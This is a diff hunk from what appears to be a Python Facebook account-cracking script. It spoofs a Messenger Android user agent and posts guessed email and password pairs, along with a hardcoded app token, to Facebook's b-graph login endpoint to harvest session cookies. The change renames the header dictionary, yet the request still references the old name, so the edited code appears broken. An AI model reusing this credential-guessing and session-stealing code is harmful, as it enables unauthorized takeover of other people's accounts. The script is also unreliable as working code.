@@ -90,7 +90,24 @@ def rndm(ids,mking_pass):
 			fbbd = subprocess.check_output('getprop ro.product.brand',shell=True).decode('utf-8').replace('\n','')
 			ua = 'Dalvik/2.1.0 (Linux; U; Android '+android_version+'; '+model+' Build/'+build+') [FBAN/Orca-Android;FBAV/'+fbav+';FBBV/'+fbbv+';FBRV/0;FBPN/com.facebook.orca;FBLC/en_US;FBMF/'+fbmf+';FBBD/'+fbbd+';FBDV/'+model+';FBSV/'+android_version+';FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/{density='+str(random.randint(1,9))+'.'+str(random.randint(1,9))+',width='+str(random.randint(500,999))+',height='+str(random.randint(999,1999))+'};FB_FW/1;]'
 			data ={"locale": "en_GB","format": "json","email": ids,"password": pas,"access_token":"438142079694454|fc0a7caa49b192f64f6f5a6d9643bb28","generate_session_cookies": 1}
-			head = {'user-agent':ua,'Host':'graph.facebook.com','Content-Type':'application/json;charset=utf-8','Content-Length':'595','Connection':'Keep-Alive','Accept-Encoding':'gzip'}
+			header_freefb = {'authority': 'b-graph.facebook.com',
+            'upgrade-insecure-requests': '1',
+            'method': 'POST',
+            'scheme': 'https',
+            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+            'accept-language': 'en-US,en;q=0.9',
+            'cache-control': 'max-age=0',
+            'sec-ch-prefers-color-scheme': 'light',
+            'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
+            'sec-ch-ua-full-version-list': '"Not:A-Brand";v="99.0.0.0", "Chromium";v="112.0.5615.137"',
+            'sec-ch-ua-mobile': '?0',
+            'sec-ch-ua-platform': '"Linux"',
+            'sec-ch-ua-platform-version': '""',
+            'sec-fetch-dest': 'document',
+            'sec-fetch-mode': 'navigate',
+            'sec-fetch-site': 'none',
+            'sec-fetch-user': '?1',
+            'user-agent':ua}
 			po = requests.post("https://b-graph.facebook.com/auth/login",data=data,headers=head).json()
 			if 'session_key' in po:
 				uid = po['uid']
